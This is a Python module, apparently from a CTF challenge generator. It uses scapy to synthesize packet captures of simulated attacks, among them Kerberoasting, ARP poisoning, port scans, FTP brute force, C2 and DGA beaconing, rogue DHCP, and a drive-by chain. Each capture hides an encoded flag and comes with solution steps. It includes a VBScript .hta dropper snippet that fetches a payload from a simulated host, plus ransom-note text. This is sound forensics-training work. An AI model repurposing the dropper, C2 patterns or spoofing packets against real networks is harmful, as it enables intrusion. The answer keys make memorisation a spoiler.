"""chumbucket.scenarios - split module (code verbatim from the monolith)."""
import base64
import gzip
import random
import time
import json
from dataclasses import field
from scapy.all import (IP, TCP, UDP, Ether, Raw, DNS, DNSQR, ARP, BOOTP, DHCP, Padding)

from .encoding import (describe_decode, dns_safe_scheme, encode_payload)
from .network import (Host, Network, _eth, _mac_bytes)
from .traffic import (_USER_AGENTS, _http_response, _tls_client_hello, _tls_record, tcp_session)
from .hiding import (HideResult)


def _krb_tgs_req(spn: str, realm: str, rng: random.Random) -> bytes:
    """Craft a recognizable (not byte-perfect) Kerberos TGS-REQ over TCP:
    the 4-byte length prefix, the APPLICATION-12 tag, an RC4/etype-23 marker,
    and the SPN/realm as KerberosStrings so an analyst can read them."""
    def kstr(s: str) -> bytes:                      # GeneralString, tag 0x1b
        b = s.encode()
        return b"\x1b" + bytes([len(b)]) + b
    etype = b"\x02\x01\x17"                          # INTEGER 23 (rc4-hmac)
    svc, host = (spn.split("/", 1) + [""])[:2]
    body = (b"\x6c\x82" +                            # APPLICATION 12 (TGS-REQ), long form
            b"\x00\x00" +                            # (placeholder length)
            b"\xa1\x03\x02\x01\x05" +                # pvno 5
            b"\xa2\x03\x02\x01\x0c" +                # msg-type 12 (TGS-REQ)
            etype + kstr(realm) + kstr(svc) + kstr(host))
    body = body[:2] + len(body[4:]).to_bytes(2, "big") + body[4:]
    return len(body).to_bytes(4, "big") + body      # TCP length prefix


def _krb_tgs_rep(realm: str, rng: random.Random) -> bytes:
    """A synthetic Kerberos TGS-REP (APPLICATION 13) whose enc-part is an opaque
    RC4-looking blob - this is the 'encrypted ticket' a real Kerberoast would crack."""
    def kstr(s):
        b = s.encode(); return b"\x1b" + bytes([len(b)]) + b
    ticket_blob = bytes(rng.getrandbits(8) for _ in range(rng.randint(180, 360)))
    enc_part = b"\xa2\x82" + len(ticket_blob).to_bytes(2, "big") + ticket_blob
    body = (b"\x6d\x82" + b"\x00\x00" +                 # APPLICATION 13 (TGS-REP)
            b"\xa0\x03\x02\x01\x05" +                   # pvno 5
            b"\xa1\x03\x02\x01\x0d" +                   # msg-type 13
            kstr(realm) + b"\x02\x01\x17" + enc_part)   # realm, etype 23, enc ticket
    body = body[:2] + len(body[4:]).to_bytes(2, "big") + body[4:]
    return len(body).to_bytes(4, "big") + body


def scenario_kerberoast(flag: bytes, rng, clock, cfg, scheme, xor_key,
                        net: Network) -> HideResult:
    """A burst of Kerberos TGS-REQ for many service SPNs (etype 23 / RC4) - the
    textbook Kerberoasting signature. One SPN's host label is the encoded flag.
    Each SPN is its own clean TCP connection (handshake, request, encrypted
    TGS-REP, teardown) so the streams look real and follow cleanly."""
    enc = encode_payload(flag, dns_safe_scheme(scheme), xor_key).decode().lower()
    realm = "CORP.LOCAL"
    attacker = rng.choice(net.clients)
    dc = net.servers.get("intranet.corp.local") or rng.choice(list(net.servers.values()))
    normal_spns = ["MSSQLSvc/db01.corp.local:1433", "HTTP/web01.corp.local",
                   "CIFS/file01.corp.local", "LDAP/dc01.corp.local",
                   "MSSQLSvc/erp.corp.local:1433", "HTTP/intranet.corp.local"]
    flag_spn = f"MSSQLSvc/{enc}.corp.local:1433"     # the odd one out
    spns = normal_spns[:]
    spns.insert(rng.randint(1, len(spns) - 1), flag_spn)

    res = HideResult()
    for spn in spns:
        req = _krb_tgs_req(spn, realm, rng)
        rep = _krb_tgs_rep(realm, rng)
        # each SPN request is its own short TCP/88 connection
        session = tcp_session(net, attacker, dc, 88,
                              [("c2s", req), ("s2c", rep)], rng, clock, cfg)
        res.packets += session
        # tag the request packet (the one carrying this SPN's bytes)
        for p in session:
            if p.haslayer(Raw) and req in bytes(p[Raw].load):
                if spn == flag_spn:
                    res.mark(p, "Kerberoast TGS-REQ with the anomalous SPN "
                                "(host label = encoded flag)")
                else:
                    res.mark(p, f"Kerberoast TGS-REQ for {spn} (decoy SPN)")
                break
        # small gap before the next connection in the burst
        clock[0] += abs(rng.gauss(0.04, 0.02)) + 0.005
    res.solution = [
        f"Notice the burst of Kerberos TGS-REQ (TCP/88) from {attacker.ip} to the DC "
        f"({dc.ip}) requesting many SPNs with RC4/etype-23 - classic Kerberoasting.",
        "List the requested SPNs; one MSSQLSvc host label is not a real hostname.",
        f"Take that host label and {describe_decode(dns_safe_scheme(scheme), xor_key)} "
        f"to recover the flag.",
    ]
    return res


def scenario_ftp_creds(flag: bytes, rng, clock, cfg, scheme, xor_key,
                       net: Network) -> HideResult:
    """A plaintext FTP login over TCP/21. The flag is the password sent in the
    clear - the 'credentials on the wire' trope. Found by following the stream."""
    # plaintext is the whole point; only encode if explicitly asked
    if scheme == "none":
        secret = flag.decode()
    else:
        secret = encode_payload(flag, scheme, xor_key).decode()
    client = rng.choice(net.clients)
    server = net.servers.get("intranet.corp.local") or rng.choice(list(net.servers.values()))
    user = rng.choice(["svc_backup", "jdoe", "ftpadmin", "deploy"])
    exch = [
        ("s2c", b"220 (vsFTPd 3.0.5)\r\n"),
        ("c2s", f"USER {user}\r\n".encode()),
        ("s2c", b"331 Please specify the password.\r\n"),
        ("c2s", f"PASS {secret}\r\n".encode()),
        ("s2c", b"230 Login successful.\r\n"),
        ("c2s", b"SYST\r\n"),
        ("s2c", b"215 UNIX Type: L8\r\n"),
    ]
    pkts = tcp_session(net, client, server, 21, exch, rng, clock, cfg)
    res = HideResult(packets=pkts)
    for p in pkts:
        if p.haslayer(Raw) and bytes(p[Raw].load).startswith(b"PASS "):
            res.mark(p, "FTP PASS command carrying the flag (cleartext password)")
            break
    tail = "read the password directly" if scheme == "none" else \
        f"take the password and {describe_decode(scheme, xor_key)}"
    res.solution = [
        f"Spot the plaintext FTP login (TCP/21) from {client.ip} to {server.ip}.",
        f"Follow the FTP control stream; the USER is '{user}' and the PASS line "
        f"carries the secret.",
        f"To get the flag, {tail}.",
    ]
    return res


def scenario_arp_spoof(flag: bytes, rng, clock, cfg, scheme, xor_key,
                       net: Network) -> HideResult:
    """ARP cache poisoning: the attacker floods gratuitous/conflicting is-at
    replies binding the gateway IP to the attacker's MAC. The encoded flag rides
    in the Ethernet padding of the malicious gratuitous ARP."""
    from scapy.all import Padding
    enc = encode_payload(flag, scheme if scheme != "none" else "base64", xor_key)
    attacker = rng.choice(net.clients)
    victim = rng.choice([c for c in net.clients if c.ip != attacker.ip])
    gw = net.gateway
    res = HideResult()
    # a few legitimate ARP first (handled by noise), then the poisoning storm:
    for i in range(rng.randint(4, 6)):
        # gratuitous/unsolicited is-at: "gateway IP is at ATTACKER mac" (the lie)
        poison = (Ether(src=attacker.mac, dst=victim.mac) /
                  ARP(op=2, hwsrc=attacker.mac, psrc=gw.ip,
                      hwdst=victim.mac, pdst=victim.ip))
        if i == 0:
            poison = poison / Padding(load=enc)   # flag tucked in the padding
        clock[0] += abs(rng.gauss(0.5, 0.2)) + 0.05
        poison.time = clock[0]
        res.packets.append(poison)
        if i == 0:
            res.mark(poison, "Malicious gratuitous ARP (gw IP -> attacker MAC); "
                             "flag is in the Ethernet padding/trailer")
        else:
            res.mark(poison, "Poisoned ARP is-at reply (decoy in the storm)")
    actual = scheme if scheme != "none" else "base64"
    res.solution = [
        f"Spot the ARP poisoning: host {attacker.ip} ({attacker.mac}) repeatedly "
        f"claims to be the gateway {gw.ip} via gratuitous is-at replies.",
        "Open the first poisoned ARP packet; the Ethernet trailer/padding holds "
        "extra non-zero bytes (not normal ARP padding).",
        f"Extract those padding bytes and {describe_decode(actual, xor_key)}.",
    ]
    return res


def scenario_port_scan(flag: bytes, rng, clock, cfg, scheme, xor_key,
                       net: Network) -> HideResult:
    """A SYN sweep across many ports of one host: closed ports answer RST, the one
    open port completes and serves a banner. The flag is in that banner."""
    enc = encode_payload(flag, scheme, xor_key).decode() if scheme != "none" else flag.decode()
    attacker = rng.choice(net.clients)
    target = rng.choice(list(net.servers.values()))
    ports = sorted(rng.sample(range(20, 1024), rng.randint(18, 28)))
    open_port = rng.choice(ports)
    res = HideResult()
    base_sport = rng.randint(20000, 40000)
    for i, port in enumerate(ports):
        sport = base_sport + i
        cseq = rng.randint(1, 2**31)
        syn = (_eth(net, attacker.ip, target.ip) / IP(src=attacker.ip, dst=target.ip) /
               TCP(sport=sport, dport=port, flags="S", seq=cseq))
        clock[0] += abs(rng.gauss(0.008, 0.003)) + 0.001
        syn.time = clock[0]
        res.packets.append(syn)
        if port == open_port:
            # SYN-ACK, ACK, then a service banner containing the flag
            sseq = rng.randint(1, 2**31)
            sa = (_eth(net, target.ip, attacker.ip) / IP(src=target.ip, dst=attacker.ip) /
                  TCP(sport=port, dport=sport, flags="SA", seq=sseq, ack=cseq + 1))
            ack = (_eth(net, attacker.ip, target.ip) / IP(src=attacker.ip, dst=target.ip) /
                   TCP(sport=sport, dport=port, flags="A", seq=cseq + 1, ack=sseq + 1))
            banner = f"220 svc ready - access token: {enc}\r\n".encode()
            data = (_eth(net, target.ip, attacker.ip) / IP(src=target.ip, dst=attacker.ip) /
                    TCP(sport=port, dport=sport, flags="PA", seq=sseq + 1, ack=cseq + 1) /
                    Raw(load=banner))
            for q in (sa, ack, data):
                clock[0] += abs(rng.gauss(0.01, 0.004)) + 0.001
                q.time = clock[0]
                res.packets.append(q)
            res.mark(data, f"Banner on the one OPEN port ({open_port}); flag is the 'access token'")
        else:
            # closed port -> RST/ACK
            rst = (_eth(net, target.ip, attacker.ip) / IP(src=target.ip, dst=attacker.ip) /
                   TCP(sport=port, dport=sport, flags="RA", seq=0, ack=cseq + 1))
            clock[0] += abs(rng.gauss(0.006, 0.002)) + 0.001
            rst.time = clock[0]
            res.packets.append(rst)
    tail = "read the token directly" if scheme == "none" else \
        f"take the token and {describe_decode(scheme, xor_key)}"
    res.solution = [
        f"Spot the SYN scan: {attacker.ip} sweeps ~{len(ports)} ports on {target.ip}; "
        f"closed ports reply RST.",
        f"Exactly one port ({open_port}) completes the handshake and returns a banner.",
        f"The banner's 'access token' is the flag - {tail}.",
    ]
    return res


def scenario_telnet_creds(flag: bytes, rng, clock, cfg, scheme, xor_key,
                          net: Network) -> HideResult:
    """Plaintext Telnet (TCP/23) login. The flag is the password typed in the clear."""
    secret = flag.decode() if scheme == "none" else encode_payload(flag, scheme, xor_key).decode()
    client = rng.choice(net.clients)
    server = rng.choice(list(net.servers.values()))
    user = rng.choice(["admin", "root", "operator", "netadmin"])
    exch = [
        ("s2c", b"\r\nUbuntu 22.04.3 LTS\r\nlogin: "),
        ("c2s", f"{user}\r\n".encode()),
        ("s2c", b"Password: "),
        ("c2s", f"{secret}\r\n".encode()),
        ("s2c", b"\r\nLast login: Tue Nov 14 09:02:11\r\n$ "),
    ]
    pkts = tcp_session(net, client, server, 23, exch, rng, clock, cfg)
    res = HideResult(packets=pkts)
    # the password is the c2s line right after the "Password:" prompt
    seen_prompt = False
    for p in pkts:
        if p.haslayer(Raw):
            load = bytes(p[Raw].load)
            if b"Password:" in load:
                seen_prompt = True
            elif seen_prompt and load.strip() and not load.startswith(b"\r\n"):
                res.mark(p, "Telnet password line (cleartext flag)")
                break
    tail = "read the password directly" if scheme == "none" else \
        f"take the password and {describe_decode(scheme, xor_key)}"
    res.solution = [
        f"Spot the plaintext Telnet login (TCP/23) from {client.ip} to {server.ip}.",
        f"Follow the stream; after the 'Password:' prompt the user '{user}' types the secret.",
        f"To get the flag, {tail}.",
    ]
    return res


def scenario_http_basic(flag: bytes, rng, clock, cfg, scheme, xor_key,
                        net: Network) -> HideResult:
    """HTTP Basic auth over cleartext. The Authorization header is
    base64("user:password") and the password is the flag."""
    pw = flag.decode() if scheme == "none" else encode_payload(flag, scheme, xor_key).decode()
    client = rng.choice(net.clients)
    server = net.servers.get("intranet.corp.local") or rng.choice(list(net.servers.values()))
    host = server.name
    user = rng.choice(["admin", "svc_web", "report_bot"])
    token = base64.b64encode(f"{user}:{pw}".encode()).decode()
    req = (f"GET /admin/ HTTP/1.1\r\nHost: {host}\r\n"
           f"Authorization: Basic {token}\r\n"
           f"User-Agent: {rng.choice(_USER_AGENTS)}\r\nAccept: */*\r\n\r\n").encode()
    admin_body = ("<!DOCTYPE html><html><head><title>Admin Console</title></head>"
                  "<body><h1>Admin Console</h1><p>Logged in as <b>" + user + "</b>.</p>"
                  "<table><tr><th>User</th><th>Role</th><th>Last seen</th></tr>"
                  "<tr><td>jdoe</td><td>auditor</td><td>2024-06-24</td></tr>"
                  "<tr><td>svc_sql</td><td>service</td><td>2024-06-25</td></tr></table>"
                  "</body></html>").encode()
    resp = _http_response(rng, host, path="/admin/", ctype="text/html; charset=UTF-8",
                          body=admin_body)
    pkts = tcp_session(net, client, server, 80, [("c2s", req), ("s2c", resp)], rng, clock, cfg)
    res = HideResult(packets=pkts)
    for p in pkts:
        if p.haslayer(Raw) and b"Authorization: Basic" in bytes(p[Raw].load):
            res.mark(p, "HTTP Basic Authorization header (base64 user:flag)")
            break
    res.solution = [
        f"Spot the HTTP Basic auth (TCP/80) from {client.ip} to host {host}.",
        "Grab the 'Authorization: Basic <token>' header and base64-decode it.",
        "The part after the ':' is the password" +
        ("" if scheme == "none" else f", then {describe_decode(scheme, xor_key)}") + ".",
    ]
    return res


def scenario_brute_force(flag: bytes, rng, clock, cfg, scheme, xor_key,
                         net: Network) -> HideResult:
    """An FTP password brute-force: many failed logins, then one success. The flag
    is the password on the one attempt that worked."""
    secret = flag.decode() if scheme == "none" else encode_payload(flag, scheme, xor_key).decode()
    client = rng.choice(net.clients)
    server = rng.choice(list(net.servers.values()))
    user = rng.choice(["administrator", "svc_sql", "backup"])
    wrong = ["Password1", "letmein", "Summer2023", "Welcome1", "P@ssw0rd",
             "admin123", "qwerty", "changeme", "Spring2024!"]
    attempts = rng.sample(wrong, rng.randint(6, 9)) + [secret]  # success is last
    exch = [("s2c", b"220 ProFTPD Server ready.\r\n")]
    for i, pw in enumerate(attempts):
        exch.append(("c2s", f"USER {user}\r\n".encode()))
        exch.append(("s2c", b"331 Password required.\r\n"))
        exch.append(("c2s", f"PASS {pw}\r\n".encode()))
        exch.append(("s2c", b"230 User logged in.\r\n" if pw == secret
                     else b"530 Login incorrect.\r\n"))
    pkts = tcp_session(net, client, server, 21, exch, rng, clock, cfg)
    res = HideResult(packets=pkts)
    # mark the successful PASS (the one followed by 230)
    for i, p in enumerate(pkts):
        if p.haslayer(Raw) and bytes(p[Raw].load).startswith(f"PASS {secret}".encode()):
            res.mark(p, "Successful PASS after many failures (flag = cracked password)")
            break
    tail = "read the password directly" if scheme == "none" else \
        f"take the password and {describe_decode(scheme, xor_key)}"
    res.solution = [
        f"Spot the brute force: {len(attempts)-1} failed FTP logins (530) from "
        f"{client.ip} to {server.ip}, then one success (230).",
        f"The PASS on the successful attempt (account '{user}') is the secret.",
        f"To get the flag, {tail}.",
    ]
    return res


def scenario_c2_beacon(flag: bytes, rng, clock, cfg, scheme, xor_key,
                       net: Network) -> HideResult:
    """C2 beaconing: regular fixed-interval HTTP callbacks to one external host.
    The flag rides (encoded) in a beacon's POST body."""
    enc = encode_payload(flag, scheme if scheme != "none" else "base64", xor_key).decode()
    client = rng.choice(net.clients)
    c2 = rng.choice([s for n, s in net.servers.items() if not n.endswith(".local")]
                    or list(net.servers.values()))
    interval = rng.choice([5.0, 10.0, 15.0])      # fixed beacon interval
    n_beacons = rng.randint(5, 8)
    flag_beacon = rng.randint(1, n_beacons - 1)
    uri = "/api/v1/telemetry"
    res = HideResult()
    start = clock[0]
    beacon_ua = rng.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    ])
    for i in range(n_beacons):
        body = (f"id=7f3a&seq={i}&data=" +
                (enc if i == flag_beacon else base64.b64encode(
                    bytes(rng.getrandbits(8) for _ in range(12))).decode())).encode()
        req = (f"POST {uri} HTTP/1.1\r\nHost: {c2.name}\r\n"
               f"User-Agent: {beacon_ua}\r\n"
               f"Accept: */*\r\nAccept-Encoding: gzip, deflate\r\n"
               f"Content-Type: application/x-www-form-urlencoded\r\n"
               f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n").encode() + body
        # realistic-looking C2 tasking reply: full headers + an encoded 'task' blob
        task = base64.b64encode(bytes(rng.getrandbits(8)
                                      for _ in range(rng.randint(16, 64)))).decode()
        rbody = ('{"status":"ok","interval":%d,"jitter":%d,"task":"%s"}'
                 % (int(interval), rng.randint(5, 20), task)).encode()
        resp = _http_response(rng, c2.name, path=uri, ctype="application/json",
                              body=rbody, set_cookie=False)
        # place each beacon at a fixed interval
        clock[0] = start + i * interval
        session = tcp_session(net, client, c2, 80, [("c2s", req), ("s2c", resp)],
                              rng, clock, cfg)
        res.packets += session
        for p in session:
            if p.haslayer(Raw) and b"POST " in bytes(p[Raw].load):
                if i == flag_beacon:
                    res.mark(p, f"C2 beacon #{i} whose POST body 'data=' carries the flag")
                else:
                    res.mark(p, f"C2 beacon #{i} (decoy callback)")
                break
    actual = scheme if scheme != "none" else "base64"
    res.solution = [
        f"Spot the C2 beaconing: {client.ip} POSTs to {c2.name} ({c2.ip}) every "
        f"~{interval:g}s - a suspiciously regular interval.",
        f"Inspect the beacon bodies; the 'data=' field of beacon #{flag_beacon} differs "
        f"from the random others.",
        f"Take that data value and {describe_decode(actual, xor_key)}.",
    ]
    return res


def scenario_rogue_dhcp(flag, rng, clock, cfg, scheme, xor_key, net):
    """A rogue DHCP server races the legit one: it answers a client's DISCOVER
    with its own OFFER advertising the ATTACKER as the gateway/DNS. The encoded
    flag rides in the rogue OFFER's BOOTP boot-file field."""
    enc = (flag.decode() if scheme == "none"
           else encode_payload(flag, scheme, xor_key).decode())
    client = rng.choice(net.clients)
    rogue = rng.choice([c for c in net.clients if c.ip != client.ip])  # attacker host
    gw = net.gateway
    chaddr = _mac_bytes(client.mac) + b"\x00" * 10
    xid = rng.randint(1, 2**32 - 1)
    res = HideResult()

    def _boot(msgtype, src_ip, dst_ip, src_mac, dst_mac, yiaddr="0.0.0.0", opts=None):
        o = [("message-type", msgtype)] + (opts or []) + ["end"]
        return (Ether(src=src_mac, dst=dst_mac) /
                IP(src=src_ip, dst=dst_ip) /
                UDP(sport=67 if msgtype in ("offer", "ack") else 68,
                    dport=68 if msgtype in ("offer", "ack") else 67) /
                BOOTP(chaddr=chaddr, xid=xid, yiaddr=yiaddr, ciaddr="0.0.0.0") /
                DHCP(options=o))

    disc = _boot("discover", "0.0.0.0", "255.255.255.255",
                 client.mac, "ff:ff:ff:ff:ff:ff")
    legit = _boot("offer", gw.ip, "255.255.255.255", gw.mac, client.mac,
                  yiaddr=client.ip,
                  opts=[("server_id", gw.ip), ("router", gw.ip),
                        ("lease_time", 86400), ("subnet_mask", "255.255.255.0")])
    rogue_off = _boot("offer", rogue.ip, "255.255.255.255", rogue.mac, client.mac,
                      yiaddr=client.ip,
                      opts=[("server_id", rogue.ip), ("router", rogue.ip),
                            ("name_server", rogue.ip), ("lease_time", 600),
                            ("subnet_mask", "255.255.255.0")])
    rogue_off[BOOTP].file = enc.encode()   # flag tucked in the boot-file field
    for p in (disc, legit, rogue_off):
        clock[0] += abs(rng.gauss(0.03, 0.01)) + 0.002
        p.time = clock[0]
        res.packets.append(p)
    res.mark(rogue_off, "Rogue DHCP OFFER (attacker as gateway/DNS); flag in boot-file")
    tail = "read it directly" if scheme == "none" else f"{describe_decode(scheme, xor_key)}"
    res.solution = [
        f"Two DHCP OFFERs answer the same DISCOVER (xid {xid:#x}): one from the real "
        f"gateway {gw.ip}, one from {rogue.ip} - a rogue DHCP server.",
        f"The rogue OFFER advertises {rogue.ip} as router AND DNS, and carries data "
        f"in the BOOTP boot-file (sname/file) field.",
        f"Take the boot-file value and {tail}.",
    ]
    return res


def scenario_ssdp_upnp(flag, rng, clock, cfg, scheme, xor_key, net):
    """SSDP/UPnP discovery abuse: an M-SEARCH to 239.255.255.250:1900 and NOTIFY
    answers. One malicious NOTIFY's LOCATION URL carries the encoded flag in a
    query parameter pointing at a rogue device description."""
    enc = (encode_payload(flag, "base64", xor_key).decode() if scheme == "none"
           else encode_payload(flag, scheme, xor_key).decode())
    client = rng.choice(net.clients)
    rogue = rng.choice([c for c in net.clients if c.ip != client.ip])
    MCAST = "239.255.255.250"
    res = HideResult()

    msearch = ("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
               'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n').encode()
    mp = (Ether(src=client.mac, dst="01:00:5e:7f:ff:fa") /
          IP(src=client.ip, dst=MCAST, ttl=2) /
          UDP(sport=rng.randint(1025, 65535), dport=1900) / Raw(load=msearch))
    clock[0] += 0.005; mp.time = clock[0]; res.packets.append(mp)

    for i in range(rng.randint(2, 4)):
        loc = f"http://{rogue.ip}:1900/desc.xml"
        usn = f"uuid:{rng.randint(0,2**32):08x}::upnp:rootdevice"
        if i == 0:
            loc = f"http://{rogue.ip}:1900/device.xml?sid={enc}"  # flag carrier
        notify = (f"NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
                  f"CACHE-CONTROL: max-age=1800\r\nLOCATION: {loc}\r\n"
                  f"NT: upnp:rootdevice\r\nNTS: ssdp:alive\r\n"
                  f"SERVER: Linux/3.14 UPnP/1.0 MiniUPnPd/2.1\r\nUSN: {usn}\r\n\r\n").encode()
        np_ = (Ether(src=rogue.mac, dst="01:00:5e:7f:ff:fa") /
               IP(src=rogue.ip, dst=MCAST, ttl=2) /
               UDP(sport=1900, dport=1900) / Raw(load=notify))
        clock[0] += abs(rng.gauss(0.04, 0.02)) + 0.003
        np_.time = clock[0]; res.packets.append(np_)
        if i == 0:
            res.mark(np_, "Malicious SSDP NOTIFY; flag in the LOCATION URL 'sid' param")
    tail = describe_decode("base64" if scheme == "none" else scheme, xor_key)
    res.solution = [
        f"Spot SSDP/UPnP traffic to {MCAST}:1900 - an M-SEARCH from {client.ip} and "
        f"NOTIFY answers from {rogue.ip}.",
        "One NOTIFY's LOCATION URL has an extra 'sid=' query parameter (a rogue device "
        "description) - that value is the encoded flag.",
        f"Take the sid value and {tail}.",
    ]
    return res


def scenario_doh_beacon(flag, rng, clock, cfg, scheme, xor_key, net):
    """Malware beacons over DNS-over-HTTPS to a public resolver at fixed intervals
    (TLS/443). The bodies are encrypted, but the TLS SNI is in the clear: one
    beacon's SNI has an extra data label that is the encoded flag."""
    enc = encode_payload(flag, dns_safe_scheme(scheme), xor_key).decode().lower()
    client = rng.choice(net.clients)
    provider = Host("104.16.249.249", net.gateway.mac, "server", "cloudflare-dns.com")
    interval = rng.choice([30.0, 60.0])
    n = rng.randint(4, 6)
    flag_idx = rng.randint(1, n - 1)
    res = HideResult()
    start = clock[0]
    for i in range(n):
        sni = "cloudflare-dns.com" if i != flag_idx else f"{enc}.cloudflare-dns.com"
        ch = _tls_client_hello(sni, rng)
        sh = _tls_record(0x16, bytes(rng.getrandbits(8) for _ in range(rng.randint(600, 1200))))
        clock[0] = start + i * interval
        session = tcp_session(net, client, provider, 443,
                              [("c2s", ch), ("s2c", sh),
                               ("c2s", _tls_record(0x17, bytes(rng.getrandbits(8) for _ in range(rng.randint(80, 200))))),
                               ("s2c", _tls_record(0x17, bytes(rng.getrandbits(8) for _ in range(rng.randint(80, 300)))))],
                              rng, clock, cfg)
        res.packets += session
        for p in session:
            if p.haslayer(Raw) and sni.encode() in bytes(p[Raw].load):
                res.mark(p, f"DoH beacon #{i} TLS ClientHello"
                            + (" (SNI carries the flag label)" if i == flag_idx else " (decoy)"))
                break
    res.solution = [
        f"Spot the regular TLS beaconing (443) from {client.ip} to the DoH resolver "
        f"{provider.ip} every ~{interval:g}s - encrypted DNS-over-HTTPS.",
        "The payloads are encrypted, but the TLS SNI (server_name) is in the clear; "
        "one ClientHello has an extra sub-label prepended to cloudflare-dns.com.",
        f"Take that label and {describe_decode(dns_safe_scheme(scheme), xor_key)} "
        f"(it is stored lowercase).",
    ]
    return res


def scenario_dga_beacon(flag, rng, clock, cfg, scheme, xor_key, net):
    """Malware resolves a burst of algorithmically-generated domains (DGA) hunting
    for its live C2. The queries look random; one query's label is the encoded
    flag rather than DGA gibberish."""
    enc = encode_payload(flag, dns_safe_scheme(scheme), xor_key).decode().lower()
    client = rng.choice(net.clients)
    tlds = [".com", ".net", ".biz", ".info", ".xyz"]
    res = HideResult()
    n = rng.randint(10, 16)
    flag_idx = rng.randint(2, n - 2)
    for i in range(n):
        if i == flag_idx:
            qname = f"{enc}{rng.choice(tlds)}"
        else:
            label = "".join(rng.choice("abcdefghijklmnopqrstuvwxyz0123456789")
                            for _ in range(rng.randint(12, 20)))
            qname = f"{label}{rng.choice(tlds)}"
        q = (_eth(net, client.ip, net.dns.ip) / IP(src=client.ip, dst=net.dns.ip) /
             UDP(sport=rng.randint(1025, 65535), dport=53) /
             DNS(rd=1, id=rng.randint(0, 65535), qd=DNSQR(qname=qname)))
        clock[0] += abs(rng.gauss(0.08, 0.03)) + 0.002
        q.time = clock[0]
        res.packets.append(q)
        if rng.random() < 0.6:
            r = (_eth(net, net.dns.ip, client.ip) / IP(src=net.dns.ip, dst=client.ip) /
                 UDP(sport=53, dport=q[UDP].sport) /
                 DNS(id=q[DNS].id, qr=1, ra=1, rcode=3, qd=DNSQR(qname=qname)))
            clock[0] += abs(rng.gauss(0.02, 0.01)) + 0.001
            r.time = clock[0]
            res.packets.append(r)
        if i == flag_idx:
            res.mark(q, "DGA query whose label is the encoded flag (not gibberish)")
    res.solution = [
        f"Spot the DGA beaconing: {client.ip} fires {n} DNS lookups to long random "
        f"domains across many TLDs, mostly NXDOMAIN - classic domain-generation.",
        "One query's label isn't random gibberish; it is the encoded flag.",
        f"Take that label and {describe_decode(dns_safe_scheme(scheme), xor_key)} "
        f"(stored lowercase).",
    ]
    return res


def scenario_malware_chain(flag, rng, clock, cfg, scheme, xor_key, net):
    """A drive-by chain: a lure URL 302-redirects through a couple of hops to a
    dropper script, which then pulls a binary payload. The dropper script embeds
    the encoded flag as its C2 key (readable in the HTTP stream)."""
    enc = (encode_payload(flag, "base64", xor_key).decode() if scheme == "none"
           else encode_payload(flag, scheme, xor_key).decode())
    client = rng.choice(net.clients)
    servers = list(net.servers.values())
    lure, hop, drop = (rng.sample(servers, 3) if len(servers) >= 3
                       else [rng.choice(servers) for _ in range(3)])
    ua = rng.choice(_USER_AGENTS)
    res = HideResult()

    req1 = (f"GET /invoice/INV-4471.doc HTTP/1.1\r\nHost: {lure.name}\r\n"
            f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n").encode()
    resp1 = _http_response(rng, lure.name, status=302,
                           location=f"http://{hop.name}/cdn/redir?u=8821", body=b"")
    res.packets += tcp_session(net, client, lure, 80, [("c2s", req1), ("s2c", resp1)], rng, clock, cfg)
    req2 = (f"GET /cdn/redir?u=8821 HTTP/1.1\r\nHost: {hop.name}\r\n"
            f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n").encode()
    resp2 = _http_response(rng, hop.name, status=302,
                           location=f"http://{drop.name}/get/update.hta", body=b"")
    res.packets += tcp_session(net, client, hop, 80, [("c2s", req2), ("s2c", resp2)], rng, clock, cfg)
    dropper = (f"<html><head><script language=\"VBScript\">\n"
               f"' auto-update component\nDim c2key, payloadUrl\n"
               f"c2key = \"{enc}\"\n"
               f"payloadUrl = \"http://{drop.name}/bin/update.bin\"\n"
               f"Set x = CreateObject(\"MSXML2.XMLHTTP\")\n"
               f"x.open \"GET\", payloadUrl, False\nx.send\n"
               f"</script></head><body>Updating...</body></html>").encode()
    req3 = (f"GET /get/update.hta HTTP/1.1\r\nHost: {drop.name}\r\n"
            f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n").encode()
    resp3 = _http_response(rng, drop.name, path="/get/update.hta",
                           ctype="application/hta", body=dropper, set_cookie=False, gzip_ok=False)
    sess3 = tcp_session(net, client, drop, 80, [("c2s", req3), ("s2c", resp3)], rng, clock, cfg)
    res.packets += sess3
    for p in sess3:
        if p.haslayer(Raw) and b"c2key" in bytes(p[Raw].load):
            res.mark(p, "Dropper script (.hta) embedding the flag as its c2key")
            break
    payload = b"MZ" + bytes(rng.getrandbits(8) for _ in range(rng.randint(400, 900)))
    req4 = (f"GET /bin/update.bin HTTP/1.1\r\nHost: {drop.name}\r\n"
            f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n").encode()
    resp4 = _http_response(rng, drop.name, path="/bin/update.bin",
                           ctype="application/octet-stream", body=payload, set_cookie=False)
    res.packets += tcp_session(net, client, drop, 80, [("c2s", req4), ("s2c", resp4)], rng, clock, cfg)
    tail = describe_decode("base64" if scheme == "none" else scheme, xor_key)
    res.solution = [
        f"Follow the redirect chain from {client.ip}: a lure on {lure.name} 302s to "
        f"{hop.name}, which 302s to {drop.name} serving an .hta dropper, which pulls "
        f"an MZ binary (/bin/update.bin).",
        "Open the dropper (.hta) stream; it sets c2key = \"<encoded flag>\".",
        f"Take the c2key value and {tail}.",
    ]
    return res


def scenario_ransomware_note(flag, rng, clock, cfg, scheme, xor_key, net):
    """Post-encryption, the host fetches/drops a ransom note. The note text is in
    the clear and contains a 'Personal ID' that is the encoded flag."""
    enc = (encode_payload(flag, "base64", xor_key).decode() if scheme == "none"
           else encode_payload(flag, scheme, xor_key).decode())
    client = rng.choice(net.clients)
    server = rng.choice([s for s in net.servers.values()])
    ua = rng.choice(_USER_AGENTS)
    res = HideResult()
    note = (b"!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\r\n\r\n"
            b"All your documents, photos and databases were encrypted with AES-256.\r\n"
            b"To recover them you must purchase the decryptor in Bitcoin.\r\n\r\n"
